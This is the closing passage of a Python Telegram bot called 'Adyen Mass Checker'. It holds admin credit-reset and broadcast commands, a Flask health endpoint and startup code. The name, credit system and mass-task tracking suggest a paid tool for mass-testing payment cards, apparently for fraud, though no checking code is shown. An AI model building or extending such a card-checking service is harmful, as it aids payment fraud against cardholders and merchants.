                parse_mode='HTML')
    except:
        bot.reply_to(message, "Error")

@bot.message_handler(commands=['reset'])
def reset_all(message):
    if not is_admin(message.from_user.id):
        return
    
    global user_credits, user_last_reset
    user_credits = {}
    user_last_reset = {}
    save_credits()
    bot.reply_to(message, "✅ All credits reset for all users")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if not is_admin(message.from_user.id):
        return
    
    if not message.reply_to_message:
        bot.reply_to(message, "Reply to a message to broadcast")
        return
    
    text = message.reply_to_message.text
    sent = 0
    
    for uid in user_credits.keys():
        try:
            bot.send_message(int(uid), 
                f"<b>📢 ANNOUNCEMENT</b>\n\n{text}\n\n━━━━━━━━━━━━━━━━\n<i>Checked by @Toenv</i>\n<i>Dev @Toenv</i>",
                parse_mode='HTML')
            sent += 1
            time.sleep(0.05)
        except:
            pass
    
    bot.reply_to(message, f"✅ Broadcast sent to {sent} users")

# ============= FLASK WEB SERVER FOR RAILWAY =============
@app.route('/')
def home():
    return {
        'status': 'running',
        'bot': 'Adyen Mass Checker',
        'developer': '@Toenv',
        'bot_stopped': BOT_STOPPED,
        'maintenance': MAINTENANCE_MODE,
        'users': len(user_credits),
        'active_mass': len(mass_tasks)
    }

@app.route('/health')
def health():
    return {'status': 'healthy'}

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

# ============= START BOT =============
def start_bot_thread():
    """Start bot in a separate thread"""
    try:
        bot.remove_webhook()
        logger.info("🚀 Adyen Mass Checker Started!")
        logger.info(f"👑 Admin ID: {ADMIN_ID}")
        logger.info(f"⚡ Threads: {MAX_THREADS}")
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        logger.error(f"Bot error: {e}")
        time.sleep(5)
        start_bot_thread()

if __name__ == "__main__":
    # Start bot in background thread
    bot_thread = th.Thread(target=start_bot_thread, daemon=True)
    bot_thread.start()
    
    # Start Flask server
    logger.info(f"🌐 Starting web server on port {PORT}")
    run_flask()
